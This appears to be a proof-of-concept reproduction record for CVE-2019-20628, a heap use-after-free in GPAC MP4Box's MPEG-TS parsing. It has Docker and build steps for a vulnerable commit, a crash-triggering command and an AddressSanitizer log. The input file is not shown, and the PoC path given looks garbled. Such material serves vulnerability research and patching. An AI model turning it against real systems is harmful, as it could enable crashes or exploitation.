### CVE-2019-20628

### PoC Links
[Github.com](https://github.com/gpac/gpac/issues/1784)

### Docker Container Run Command
```shell
docker build -t cve-2019-20628-poc .
docker run --privileged --security-opt seccomp=unconfined -itd --name CVE-2019-20628-POC cve-2019-20628-poc
docker exec -it CVE-2019-20628-POC /bin/bash
```

### PoC Reproduce Command
```shell
# Preparing the initial environment
apt-get update -y
apt-get install git -y

# Configure local SSH for Github and clone the repository. (ssh-keygen)
cd /poc
git clone git@github.com:gpac/gpac.git

# Rollback to the vulnerable version.
cd gpac/
git reset --hard 987169b59690787381d311a08dfa4fc7d76e7c59

# Install the compilation and installation dependencies.
apt install gcc make gdb zlib1g-dev pkg-config clang libtool-bin build-essential llvm-dev libunwind-dev -y

# Configure, compile, and install.
./configure --enable-sanitizer --enable-debug --static-mp4box --use-zlib=no --use-bzip=no --use-png=no --use-jpeg=no
make
make install

# Open the poc file.
MP4Box -info /poc/PoC_uaf_mpegts.c:2183
```

### Description
Observed that:
```shell
=================================================================
==9203==ERROR: AddressSanitizer: heap-use-after-free on address 0xffffa1100b50 at pc 0xaaaab67701ec bp 0xffffecb25450 sp 0xffffecb25460
WRITE of size 2 at 0xffffa1100b50 thread T0
#0 0xaaaab67701e8 in gf_m2ts_process_pmt media_tools/mpegts.c:2183
#1 0xaaaab6765350 in gf_m2ts_section_complete media_tools/mpegts.c:1610
#2 0xaaaab6768a3c in gf_m2ts_gather_section media_tools/mpegts.c:1740
#3 0xaaaab678953c in gf_m2ts_process_packet media_tools/mpegts.c:3446
#4 0xaaaab678afc8 in gf_m2ts_process_data media_tools/mpegts.c:3507
#5 0xaaaab679d584 in gf_m2ts_probe_file media_tools/mpegts.c:4641
#6 0xaaaab674a98c in gf_media_import media_tools/media_import.c:10998
#7 0xaaaab5b4bfe0 in convert_file_info /poc/gpac/applications/mp4box/fileimport.c:124
#8 0xaaaab5aff970 in mp4boxMain /poc/gpac/applications/mp4box/main.c:4804
#9 0xaaaab5b0d270 in main /poc/gpac/applications/mp4box/main.c:5891
#10 0xffffa4dd73f8 in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58
#11 0xffffa4dd74c8 in __libc_start_main_impl ../csu/libc-start.c:392
#12 0xaaaab5ac6a2c in _start (/usr/local/bin/MP4Box+0x1913a2c)

0xffffa1100b50 is located 0 bytes inside of 26-byte region [0xffffa1100b50,0xffffa1100b6a)
freed by thread T0 here:
#0 0xffffa577a69c in __interceptor_realloc ../../../../src/libsanitizer/asan/asan_malloc_linux.cpp:164
#1 0xaaaab5ba9aec in gf_realloc utils/alloc.c:160
#2 0xaaaab676850c in gf_m2ts_gather_section media_tools/mpegts.c:1730
#3 0xaaaab6785af8 in gf_m2ts_process_packet media_tools/mpegts.c:3310
#4 0xaaaab678afc8 in gf_m2ts_process_data media_tools/mpegts.c:3507
#5 0xaaaab679d584 in gf_m2ts_probe_file media_tools/mpegts.c:4641
#6 0xaaaab674a98c in gf_media_import media_tools/media_import.c:10998
#7 0xaaaab5b4bfe0 in convert_file_info /poc/gpac/applications/mp4box/fileimport.c:124
#8 0xaaaab5aff970 in mp4boxMain /poc/gpac/applications/mp4box/main.c:4804
#9 0xaaaab5b0d270 in main /poc/gpac/applications/mp4box/main.c:5891
#10 0xffffa4dd73f8 in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58
#11 0xffffa4dd74c8 in __libc_start_main_impl ../csu/libc-start.c:392
#12 0xaaaab5ac6a2c in _start (/usr/local/bin/MP4Box+0x1913a2c)

previously allocated by thread T0 here:
#0 0xffffa577a2f4 in __interceptor_malloc ../../../../src/libsanitizer/asan/asan_malloc_linux.cpp:145
#1 0xaaaab5ba9aa4 in gf_malloc utils/alloc.c:150
#2 0xaaaab67670d8 in gf_m2ts_gather_section media_tools/mpegts.c:1705
#3 0xaaaab6785af8 in gf_m2ts_process_packet media_tools/mpegts.c:3310
#4 0xaaaab678afc8 in gf_m2ts_process_data media_tools/mpegts.c:3507
#5 0xaaaab679d584 in gf_m2ts_probe_file media_tools/mpegts.c:4641
#6 0xaaaab674a98c in gf_media_import media_tools/media_import.c:10998
#7 0xaaaab5b4bfe0 in convert_file_info /poc/gpac/applications/mp4box/fileimport.c:124
#8 0xaaaab5aff970 in mp4boxMain /poc/gpac/applications/mp4box/main.c:4804
#9 0xaaaab5b0d270 in main /poc/gpac/applications/mp4box/main.c:5891
#10 0xffffa4dd73f8 in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58
#11 0xffffa4dd74c8 in __libc_start_main_impl ../csu/libc-start.c:392
#12 0xaaaab5ac6a2c in _start (/usr/local/bin/MP4Box+0x1913a2c)

SUMMARY: AddressSanitizer: heap-use-after-free media_tools/mpegts.c:2183 in gf_m2ts_process_pmt
Shadow bytes around the buggy address:
0x200ff4220110: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
0x200ff4220120: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
0x200ff4220130: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
0x200ff4220140: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
0x200ff4220150: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
=>0x200ff4220160: fa fa fa fa 00 00 00 fa fa fa[fd]fd fd fd fa fa
0x200ff4220170: 00 00 00 fa fa fa fa fa fa fa fa fa fa fa fa fa
0x200ff4220180: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
0x200ff4220190: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
0x200ff42201a0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
0x200ff42201b0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
Addressable:           00
Partially addressable: 01 02 03 04 05 06 07
Heap left redzone:       fa
Freed heap region:       fd
Stack left redzone:      f1
Stack mid redzone:       f2
Stack right redzone:     f3
Stack after return:      f5
Stack use after scope:   f8
Global redzone:          f9
Global init order:       f6
Poisoned by user:        f7
Container overflow:      fc
Array cookie:            ac
Intra object redzone:    bb
ASan internal:           fe
Left alloca redzone:     ca
Right alloca redzone:    cb
Shadow gap:              cc
==9203==ABORTING
```



